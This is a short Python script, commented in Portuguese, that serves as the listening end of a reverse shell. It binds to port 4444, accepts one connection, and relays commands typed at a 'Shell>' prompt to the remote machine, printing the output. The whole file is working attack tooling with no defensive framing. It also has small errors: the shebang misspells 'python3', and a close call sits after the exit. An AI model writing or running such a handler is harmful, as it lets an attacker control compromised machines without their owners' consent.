#!/usr/bin/env pytyhon3
# -*- coding: utf-8 -*-

import socket
import sys

# criando socket e recebendo conexao
ip = ""
port = 4444
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((ip,port))
s.listen(1)

print(f"[+]Esperando conexao na porta: {port}")

conn,addr = s.accept()

# enviando comandos

while True:
    try:
        shell = input("Shell> ")
        if shell == 'exit':
            sys.exit()
            conn.close()
            break

        if len(str.encode(shell)) > 0:
            conn.send(str.encode(shell))
            c_responde = str(conn.recv(1024), 'utf-8')
            print(c_responde, end="")
    
    except KeyboardInterrupt:
        sys.exit()